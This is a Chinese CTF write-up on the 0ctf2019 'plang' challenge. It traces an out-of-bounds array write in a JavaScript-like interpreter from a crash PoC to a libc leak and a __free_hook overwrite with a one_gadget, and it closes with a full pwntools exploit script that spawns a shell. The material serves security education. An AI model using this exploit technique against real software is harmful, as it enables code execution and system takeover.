# 从crash到getshell 0ctf2019_plang 详解

阅读量 **256852**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-04-26 15:00:15

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01566cfdeb570344cd.jpg)

这是0ctf中的一道题目，题目提供了一个poc文件

    
    
    var a = "This is a PoC!"
    
    System.print(a)
    
    var b = [1, 2, 3]
    
    b[0x80000000] = 0x123

我们在ida中的字符串中能够发现如下的代码：

![](https://p3.ssl.qhimg.com/t01dd64327a7ab489c5.png)

可以看出这是一个类似于javascript的解释器。

gdb加载程序，并设置参数，程序crash了。这是因为

![](https://p5.ssl.qhimg.com/t014c78320e1dde48b0.png)

## 漏洞分析：

我们发现rcx寄存器是个非法的地址。查看代码我们发现rcx是通过rax+rdx获取的，而rax和rdx是在栈上获取的。

![](https://p4.ssl.qhimg.com/t01bc6305a3090167e3.png)

通过调试我们可以看到，rax是数组b的基址，rdx是数组的偏移。漏洞点就在数组存在越界读写。

为了利用该漏洞，我们需要分析清楚该js解释器的数据结构，才能来进行读写。

分析数据结构，构造如下的poc

    
    
    var a = "This is a PoC!"
    
    System.print(a)
    
    var b = [1, 2, "aaaaa",[3,"ddddd"]]
    
    
    Strcut obj_ptr{
    
    long unkown;
    
    void *ptr1;
    
    void *ptr2;
    
    objbuffrer *ptr;
    
    int size;
    
    int size;
    
    }

我们在数组中声明的变量值为1和2，在堆中却为0x3ff0000000000000和0x4000000000000000，实际上是用浮点形式存储的。所以我们读写的数据都要按照浮点形式存储。

    
    
    Struct objtype{
    
    long type;//如果是double类型的为4，如果为其他类型的为5
    
    union{
    
            double value;
    
            obj_ptr* obj;
    
        };
    
    }
    
    struct objstr{
    
        int type;
    
        int padding;
    
        void* ptr1;
    
        void* ptr2;
    
        int some_val;
    
        int size;
    
    char[] contents;
    
    };

## 漏洞利用：

### 地址泄露

在分析程序的时候，我们注意到Objstr类型，有一个size位，如果利用任意地址写，将Objstr类型的size位改大，就能打印出很多地址，而后面的内存中正好有libc有关的地址。

![](https://p5.ssl.qhimg.com/t012e713308c796254a.png)

这里有几个地方需要注意：一个是偏移的计算，一个是要将size转化成double类型。

![](https://p4.ssl.qhimg.com/t016aec4c337a41d904.png)

如果我们直接打印字符串a，后面的’x00’会截断，我们通过下面的方式逐个字节读取

![](https://p3.ssl.qhimg.com/t015dbcf7a514eadb7f.png)

### 任意地址写

我们发现obj_ptr结构体中存在一个指针，将objbuffrer 的指针改写成我们想改写的地址即可。

    
    
    Strcut obj_ptr{
    
    long unkown;
    
    void *ptr1;
    
    void *ptr2;
    
    objbuffrer *ptr;
    
    int size;
    
    int size;
    
    }

尝试了malloc_hook和free_hook后发现有个onegadget劫持free_hook可以拿到shell。

## exp:

    
    
    from pwn import *
    
    import struct
    
    EXE='./plang'
    
    
    
    context.binary = EXE
    
    elf = ELF(EXE)
    
    libc=elf.libc
    
    io=process(EXE)
    
    
    
    def dbg(s=''):
    
    gdb.attach(io,s)
    
    def runscript(pay):
    
    io.sendlineafter('> ',pay)
    
    
    
    def int2double(num):
    
    return struct.pack("<d", num).encode('hex')
    
    def double2int(nstr):
    
    return (struct.unpack('d', nstr)[0])
    
    
    
    libcoffset=0x155554f88ca0- 0x155554b9d000
    
    heapoffset=0x555555780750-(0x5555557741b8-0x10)
    
    
    
    one_gadget=[0x4f2c5,0x4f322,0x10a38c]
    
    buf=''
    
    
    
    pay1= "var a = "aaaaaa""
    
    pay3= "var b = [1, 2, "bbbbbb"]"
    
    pay4= "var c = [ 4 , 5]"
    
    b_addr = 0x555555788b70
    
    a_addr = 0x555555787f20
    
    offset=(a_addr-b_addr)/16
    
    lens=1#int2double(0x100)
    
    pay5= "b[%d] = %d" %(offset,lens)
    
    
    
    paylist=[pay1,pay3,pay4,pay5]
    
    for i in paylist:
    
    runscript(i)
    
    
    
    
    
    slibc = (0x555555788028 - 0x555555787f30)
    
    pay1="System.print(a[%d])"%slibc
    
    pay2="System.print(a[%d])"%(slibc+1)
    
    pay3="System.print(a[%d])"%(slibc+2)
    
    pay4="System.print(a[%d])"%(slibc+3)
    
    pay5="System.print(a[%d])"%(slibc+4)
    
    pay6="System.print(a[%d])"%(slibc+5)
    
    paylist=[pay1,pay2,pay3,pay4,pay5,pay6]
    
    for i in paylist:
    
    runscript(i)
    
    buf+=io.recv(1)
    
    libcaddr=u64(buf.ljust(8,'x00')) - libcoffset
    
    print 'libcaddr:',hex(libcaddr)
    
    libc.address=libcaddr
    
    
    
    c_addr=0x555555788e10+0x20
    
    offset=(b_addr-c_addr)/16
    
    free_hook=libc.sym['__free_hook']
    
    lens=double2int(p64(free_hook-8))
    
    pay1= "c[%d] = %.330f" %(offset,lens)
    
    
    
    runscript(pay1)
    
    data=double2int(p64(libcaddr+one_gadget[1]))
    
    pay2="b[0]=%.330f"%(data)
    
    runscript(pay2)
    
    pay="var e="aaaaaaaaaa""
    
    runscript(pay)
    
    io.interactive()

## 体会感受：

这道题目不同于传统的pwn堆利用的那种菜单题目，如果上来就通过ida，gdb从头分析程序，会花费大量时间和精力，难度也很大。我们从poc入手通过crash分析程序的漏洞点，理清数据结构，从而实现利用，比较接近现实中漏洞利用的过程。

## 参考：

<https://changochen.github.io/2019-03-23-0ctf-2019.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **王核桃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/177270](/post/id/177270)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __5赞

 __收藏

![](https://p1.ssl.qhimg.com/t01ae9eebbd5d843ed7.png) 王核桃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

